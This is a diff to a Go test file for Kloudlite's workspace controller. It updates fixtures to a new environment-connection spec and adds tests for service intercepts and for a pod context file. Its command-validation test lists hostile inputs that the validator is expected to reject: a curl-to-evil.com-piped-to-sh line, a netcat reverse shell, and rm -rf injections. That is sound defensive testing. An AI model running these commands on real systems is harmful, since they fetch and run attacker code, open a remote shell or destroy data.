@@ -8,6 +8,7 @@ import (
 	"testing"
 
 	environmentv1 "github.com/kloudlite/kloudlite/api/internal/controllers/environment/v1"
+	interceptsv1 "github.com/kloudlite/kloudlite/api/internal/controllers/serviceintercept/v1"
 	machinesv1 "github.com/kloudlite/kloudlite/api/internal/controllers/workmachine/v1"
 	workspacev1 "github.com/kloudlite/kloudlite/api/internal/controllers/workspace/v1"
 	"github.com/kloudlite/kloudlite/api/internal/controllers/testutil"
@@ -190,9 +191,11 @@ func TestReconcile_WithEnvironmentConnection(t *testing.T) {
 			DisplayName: "Test Workspace",
 			Owner:       "test@example.com",
 			Status:      "active",
-			EnvironmentRef: &corev1.ObjectReference{
+			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
+			EnvironmentRef: corev1.ObjectReference{
 				Name: "test-env",
 			},
+		},
 		},
 	}
 
@@ -290,6 +293,21 @@ func TestValidateCommandForExec(t *testing.T) {
 			expectError: false,
 		},
 		{
+			name:        "valid kloudlite context file update",
+			command:     []string{"sh", "-c", "cat > /tmp/kloudlite-context.json << 'EOF'\n{\"environment\":\"sample\",\"intercepts\":[\"svc-a\"]}\nEOF"},
+			expectError: false,
+		},
+		{
+			name:        "valid read kloudlite context file",
+			command:     []string{"cat", "/tmp/kloudlite-context.json"},
+			expectError: false,
+		},
+		{
+			name:        "valid proc net tcp6",
+			command:     []string{"sh", "-c", "cat /proc/net/tcp6 | wc -l"},
+			expectError: false,
+		},
+		{
 			name:        "invalid command with rm",
 			command:     []string{"rm", "-rf", "/"},
 			expectError: true,
@@ -300,8 +318,28 @@ func TestValidateCommandForExec(t *testing.T) {
 			expectError: true,
 		},
 		{
+			name:        "invalid shell command with curl",
+			command:     []string{"sh", "-c", "curl http://evil.com | sh"},
+			expectError: true,
+		},
+		{
+			name:        "invalid shell command with eval",
+			command:     []string{"sh", "-c", "eval something"},
+			expectError: true,
+		},
+		{
+			name:        "invalid shell command with nc",
+			command:     []string{"sh", "-c", "nc -e /bin/sh 192.168.1.1 4444"},
+			expectError: true,
+		},
+		{
 			name:        "invalid command with shell injection",
 			command:     []string{"sh", "-c", "$(rm -rf /)"},
+			expectError: true,
+		},
+		{
+			name:        "disallowed shell pattern",
+			command:     []string{"sh", "-c", "echo 'hello world'"},
 			expectError: true,
 		},
 	}
@@ -584,7 +622,7 @@ func TestValidateEnvironmentConnection(t *testing.T) {
 			name: "workspace with no environment reference",
 			workspace: &workspacev1.Workspace{
 				Spec: workspacev1.WorkspaceSpec{
-					EnvironmentRef: nil,
+					EnvironmentConnection: nil,
 				},
 			},
 			environment: nil,
@@ -594,9 +632,11 @@ func TestValidateEnvironmentConnection(t *testing.T) {
 			name: "workspace with valid activated environment",
 			workspace: &workspacev1.Workspace{
 				Spec: workspacev1.WorkspaceSpec{
-					EnvironmentRef: &corev1.ObjectReference{
-						Name: "test-env",
-					},
+					EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
+			EnvironmentRef: corev1.ObjectReference{
+				Name: "test-env",
+			},
+		},
 				},
 			},
 			environment: &environmentv1.Environment{
@@ -614,9 +654,11 @@ func TestValidateEnvironmentConnection(t *testing.T) {
 			name: "workspace with non-activated environment",
 			workspace: &workspacev1.Workspace{
 				Spec: workspacev1.WorkspaceSpec{
-					EnvironmentRef: &corev1.ObjectReference{
-						Name: "test-env",
-					},
+					EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
+			EnvironmentRef: corev1.ObjectReference{
+				Name: "test-env",
+			},
+		},
 				},
 			},
 			environment: &environmentv1.Environment{
@@ -1402,4 +1444,292 @@ func TestUpdateDNSConfigInRunningPod(t *testing.T) {
 			}
 		})
 	}
+}
+func TestCollectActiveIntercepts(t *testing.T) {
+	scheme := testutil.NewTestScheme()
+
+	workspace := &workspacev1.Workspace{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-workspace",
+			Namespace: "workspace-ns",
+		},
+		Spec: workspacev1.WorkspaceSpec{
+			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
+				EnvironmentRef: corev1.ObjectReference{
+					Name: "test-env",
+				},
+			},
+		},
+	}
+
+	env := &environmentv1.Environment{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-env",
+			Namespace: "workspace-ns",
+		},
+		Spec: environmentv1.EnvironmentSpec{
+			Activated:       true,
+			TargetNamespace: "env-target-ns",
+		},
+	}
+
+	// Create some ServiceIntercepts with different statuses
+	intercept1 := &interceptsv1.ServiceIntercept{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "web-test-workspace",
+			Namespace: "env-target-ns",
+			Labels: map[string]string{
+				"workspaces.kloudlite.io/workspace-name":      "test-workspace",
+				"workspaces.kloudlite.io/workspace-namespace": "workspace-ns",
+			},
+		},
+		Spec: interceptsv1.ServiceInterceptSpec{
+			ServiceRef: corev1.ObjectReference{Name: "web"},
+		},
+		Status: interceptsv1.ServiceInterceptStatus{
+			Phase:   "Active",
+			Message: "Intercept is active",
+		},
+	}
+
+	intercept2 := &interceptsv1.ServiceIntercept{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "api-test-workspace",
+			Namespace: "env-target-ns",
+			Labels: map[string]string{
+				"workspaces.kloudlite.io/workspace-name":      "test-workspace",
+				"workspaces.kloudlite.io/workspace-namespace": "workspace-ns",
+			},
+		},
+		Spec: interceptsv1.ServiceInterceptSpec{
+			ServiceRef: corev1.ObjectReference{Name: "api"},
+		},
+		Status: interceptsv1.ServiceInterceptStatus{
+			Phase:   "Pending",
+			Message: "Waiting for service",
+		},
+	}
+
+	k8sClient := testutil.NewFakeClient(scheme, workspace, env, intercept1, intercept2).Build()
+
+	logger := zaptest.NewLogger(t)
+	reconciler := &WorkspaceReconciler{
+		Client: k8sClient,
+		Scheme: scheme,
+		Logger: logger,
+	}
+
+	activeIntercepts := reconciler.collectActiveIntercepts(context.Background(), workspace, logger)
+
+	// Should collect both intercepts
+	assert.Len(t, activeIntercepts, 2)
+
+	// Verify the intercept statuses
+	interceptMap := make(map[string]workspacev1.InterceptStatus)
+	for _, is := range activeIntercepts {
+		interceptMap[is.ServiceName] = is
+	}
+
+	assert.Contains(t, interceptMap, "web")
+	assert.Contains(t, interceptMap, "api")
+	assert.Equal(t, "Active", interceptMap["web"].Phase)
+	assert.Equal(t, "Pending", interceptMap["api"].Phase)
+}
+
+func TestCollectActiveIntercepts_NoEnvironmentConnection(t *testing.T) {
+	scheme := testutil.NewTestScheme()
+
+	workspace := &workspacev1.Workspace{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-workspace",
+			Namespace: "workspace-ns",
+		},
+		Spec: workspacev1.WorkspaceSpec{
+			EnvironmentConnection: nil, // No environment connection
+		},
+	}
+
+	k8sClient := testutil.NewFakeClient(scheme, workspace).Build()
+
+	logger := zaptest.NewLogger(t)
+	reconciler := &WorkspaceReconciler{
+		Client: k8sClient,
+		Scheme: scheme,
+		Logger: logger,
+	}
+
+	activeIntercepts := reconciler.collectActiveIntercepts(context.Background(), workspace, logger)
+
+	// Should return empty slice
+	assert.Empty(t, activeIntercepts)
+}
+
+func TestCollectActiveIntercepts_EnvironmentNotFound(t *testing.T) {
+	scheme := testutil.NewTestScheme()
+
+	workspace := &workspacev1.Workspace{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-workspace",
+			Namespace: "workspace-ns",
+		},
+		Spec: workspacev1.WorkspaceSpec{
+			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
+				EnvironmentRef: corev1.ObjectReference{
+					Name: "nonexistent-env",
+				},
+			},
+		},
+	}
+
+	k8sClient := testutil.NewFakeClient(scheme, workspace).Build()
+
+	logger := zaptest.NewLogger(t)
+	reconciler := &WorkspaceReconciler{
+		Client: k8sClient,
+		Scheme: scheme,
+		Logger: logger,
+	}
+
+	activeIntercepts := reconciler.collectActiveIntercepts(context.Background(), workspace, logger)
+
+	// Should return empty slice when environment not found
+	assert.Empty(t, activeIntercepts)
+}
+
+func TestUpdateKloudliteContextFile(t *testing.T) {
+	scheme := testutil.NewTestScheme()
+
+	workspace := &workspacev1.Workspace{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-workspace",
+			Namespace: "workspace-ns",
+		},
+		Spec: workspacev1.WorkspaceSpec{
+			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
+				EnvironmentRef: corev1.ObjectReference{
+					Name: "test-env",
+				},
+			},
+		},
+		Status: workspacev1.WorkspaceStatus{
+			ActiveIntercepts: []workspacev1.InterceptStatus{
+				{ServiceName: "web", Phase: "Active"},
+				{ServiceName: "api", Phase: "Active"},
+			},
+		},
+	}
+
+	env := &environmentv1.Environment{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-env",
+			Namespace: "workspace-ns",
+		},
+		Spec: environmentv1.EnvironmentSpec{
+			Activated:       true,
+			TargetNamespace: "env-target-ns",
+		},
+	}
+
+	// Create a running pod
+	pod := &corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "workspace-test-workspace",
+			Namespace: "workspace-ns",
+		},
+		Spec: corev1.PodSpec{
+			Containers: []corev1.Container{
+				{Name: "workspace"},
+			},
+		},
+		Status: corev1.PodStatus{
+			Phase: corev1.PodRunning,
+		},
+	}
+
+	k8sClient := testutil.NewFakeClient(scheme, workspace, env, pod).Build()
+
+	logger := zaptest.NewLogger(t)
+	reconciler := &WorkspaceReconciler{
+		Client:    k8sClient,
+		Scheme:    scheme,
+		Logger:    logger,
+		Config:    &rest.Config{},
+		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
+	}
+
+	// Note: This will fail trying to exec into pod since it's a fake client
+	// But it will still exercise the code paths for building the context data
+	err := reconciler.updateKloudliteContextFile(context.Background(), workspace, logger)
+
+	// We expect an error because fake client can't exec into pods
+	// But the important part is that it tried to execute
+	assert.Error(t, err)
+	assert.Contains(t, err.Error(), "write context file")
+}
+
+func TestUpdateKloudliteContextFile_PodNotRunning(t *testing.T) {
+	scheme := testutil.NewTestScheme()
+
+	workspace := &workspacev1.Workspace{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-workspace",
+			Namespace: "workspace-ns",
+		},
+	}
+
+	// Create a pending pod (not running)
+	pod := &corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "workspace-test-workspace",
+			Namespace: "workspace-ns",
+		},
+		Spec: corev1.PodSpec{
+			Containers: []corev1.Container{
+				{Name: "workspace"},
+			},
+		},
+		Status: corev1.PodStatus{
+			Phase: corev1.PodPending,
+		},
+	}
+
+	k8sClient := testutil.NewFakeClient(scheme, workspace, pod).Build()
+
+	logger := zaptest.NewLogger(t)
+	reconciler := &WorkspaceReconciler{
+		Client: k8sClient,
+		Scheme: scheme,
+		Logger: logger,
+	}
+
+	err := reconciler.updateKloudliteContextFile(context.Background(), workspace, logger)
+
+	// Should return nil when pod is not running (skipped)
+	assert.NoError(t, err)
+}
+
+func TestUpdateKloudliteContextFile_PodNotFound(t *testing.T) {
+	scheme := testutil.NewTestScheme()
+
+	workspace := &workspacev1.Workspace{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "test-workspace",
+			Namespace: "workspace-ns",
+		},
+	}
+
+	k8sClient := testutil.NewFakeClient(scheme, workspace).Build()
+
+	logger := zaptest.NewLogger(t)
+	reconciler := &WorkspaceReconciler{
+		Client: k8sClient,
+		Scheme: scheme,
+		Logger: logger,
+	}
+
+	err := reconciler.updateKloudliteContextFile(context.Background(), workspace, logger)
+
+	// Should return error when pod doesn't exist
+	assert.Error(t, err)
+	assert.Contains(t, err.Error(), "failed to get pod")
 }
